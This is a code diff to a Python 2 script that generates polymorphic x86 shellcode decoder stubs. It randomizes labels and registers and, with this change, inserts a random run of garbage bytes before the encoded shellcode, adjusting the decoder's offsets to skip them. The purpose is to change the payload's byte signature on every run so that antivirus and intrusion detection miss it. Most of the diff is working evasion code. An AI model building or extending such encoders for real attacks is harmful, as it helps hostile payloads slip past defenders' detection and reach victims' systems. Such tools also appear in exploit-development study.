@@ -63,6 +63,7 @@ else:
 	else:
 		content = sys.argv[1].decode("string_escape")
 
+	# encode the shell...
 	input = ""
 	originalShellcodeLength = 0
 	for x in bytearray(content):
@@ -96,6 +97,16 @@ else:
 	# generate decode label
 	randomString = [random.choice(string.ascii_letters) for n in xrange(10)]
 	decode = "".join(randomString)
+	# generate garbage label
+	randomString = [random.choice(string.ascii_letters) for n in xrange(10)]
+	garbageLabel = "".join(randomString)
+	garbageBytes = ""
+	numberOfGarbageBytes = random.randint(0, 5)
+	for i in range(numberOfGarbageBytes):
+		tmpRnd2 = random.randint(1, 255)
+		garbageBytes += str(hex(tmpRnd2)) + ", "
+	garbageBytes = garbageBytes[:len(garbageBytes)-2]
+	garbageLabel += ": db " + garbageBytes + "\n"
 
 	# define which register is used for what
 	tmp = random.randint(0, len(unusedRegisters)-1)
@@ -145,7 +156,7 @@ else:
 	# access decoder procedure
 	assembler += decoder + ":\n"
 	assembler += "\tpop " + popRegister + "\n"
-        assembler += "\tlea " + shellIterator + ", [" + popRegister + "+1]\n"
+        assembler += "\tlea " + shellIterator + ", [" + popRegister + " + 1 + " + str(numberOfGarbageBytes) + "]\n"
 	tmpRand = random.randint(0, 1)
 	tmpRegister = random.randint(0, len(commonRegisters)-1)
 	if tmpRand == 0:
@@ -157,13 +168,13 @@ else:
         if tmpRand == 0:
                 assembler += "\tmov " + tmpValue + ", " + commonRegisters[tmpRegister] + "\n"
 	assembler += "\txor " + tmpValue + ", " + tmpValue + "\n"
-	assembler += "\tnot byte [" + popRegister + "]\n"	
+	assembler += "\tnot byte [" + popRegister + " +  " + str(numberOfGarbageBytes) + "]\n"	
 	# access decode procedure
 	assembler += decode + ":\n"
-	assembler += "\tmov " + tmpValueLowerByte + ", byte [" + popRegister + " + " + insertIterator + "]\n"
+	assembler += "\tmov " + tmpValueLowerByte + ", byte [" + popRegister + " + " + insertIterator + " + " + str(numberOfGarbageBytes) + "]\n"
 	assembler += "\txor " + tmpValueLowerByte + ", " + stoppingByte + "\n"
 	assembler += "\tjz short " + shellcodeLabel + "\n"
-	assembler += "\tmov " + tmpValueLowerByte + ", byte [" + popRegister + " + " + insertIterator + " + 1]\n"
+	assembler += "\tmov " + tmpValueLowerByte + ", byte [" + popRegister + " + " + insertIterator + " + 1 + " + str(numberOfGarbageBytes) + "]\n"
 	assembler += "\tmov byte [" + shellIterator + "], " + tmpValueLowerByte + "\n"
 	assembler += "\tnot byte [" + shellIterator + "]\n"
 	tmpRand = random.randint(0, 1)
@@ -188,6 +199,8 @@ else:
 	# execute call
 	assembler += "\tcall " + decoder + "\n"
 	# add shellcode
+	if numberOfGarbageBytes > 0:
+		assembler += "\t" + garbageLabel
 	assembler += "\t" + shellcode
 	callAfterOrders = random.randint(0, 3)     
 	assembler += callPoly(callAfterOrders)
